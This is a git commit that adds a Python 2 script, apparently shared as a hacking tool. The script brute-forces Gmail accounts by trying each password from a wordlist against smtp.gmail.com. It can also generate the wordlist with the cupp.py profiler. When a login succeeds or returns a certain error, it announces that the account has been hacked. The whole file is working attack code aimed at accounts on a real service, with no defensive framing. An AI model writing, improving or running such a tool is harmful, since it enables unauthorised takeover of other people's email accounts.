5921cfc8fdcd8cc97dd96299100f113f6d4e888f
AxelOrtega <49375332+AxelOrtega@users.noreply.github.com>
2020-11-01 13:22:23 -0600

    Add files via upload

---
+++ Permute.py
@@ -0,0 +1,60 @@
+#!/usr/bin/python
+'''# coding = utf-8'''
+'''creado por AXThct'''
+import smtplib
+from os import system
+import os
+
+def main():
+   print '================================================='
+   print '               creado por AXThct                  '
+   print '================================================='
+   print '                                                 '
+   print '\n                                               '
+   print ' =====                                                  '
+   print ' |%   ||     &?>>>    % ***>  %&   &%  &   $ 01010101      &?>>>      '
+   print ' |%   //    &?        0   /   # & & #  %   #    01        &?     '
+   print ' |%==//    &?==>>    & ==O    #  %  #  $   &    10       &?==>>     ' 
+   print ' |%       &?        %  \      #     #  $   &    11      &?     '
+   print ' |%      &?#==>>   %$   \     #     #  \&#&/    00     &?#==>>     \n'      
+main()
+print '[1] Iniciar'
+print '[2] Crear Diccioanrio'
+print '[3] Salir'
+option = input('==>')
+if option == 1:
+   file_path = raw_input('Direccion del diccionario (txt) :')
+elif option == 2:
+   os.system("python3 cupp.py -i")
+   '''exec(open("cupp.py").read())'''
+else:
+   system('clear')
+   exit()
+pass_file = open(file_path,'r')
+pass_list = pass_file.readlines()
+def login():
+    i = 0
+    user_name = raw_input('Correo Electronico :')
+    server = smtplib.SMTP_SSL('smtp.gmail.com', 465)
+    server.ehlo()
+    for password in pass_list:
+      i = i + 1
+      print str(i) + '/' + str(len(pass_list))
+      try:
+         server.login(user_name, password)
+         system('clear')
+         main()
+         print '\n'
+         print '[+] La cuanta a sido hackeada con :' + password + '     '
+         break
+      except smtplib.SMTPAuthenticationError as e:
+         error = str(e)
+         if error[14] == '<':
+            system('clear')
+            main()
+            print '[+] La cuanta a sido hackeada con :' + password + '     '
+
+            break
+         else:
+            print '[!] Contrasena Invalida => ' + password
+login()
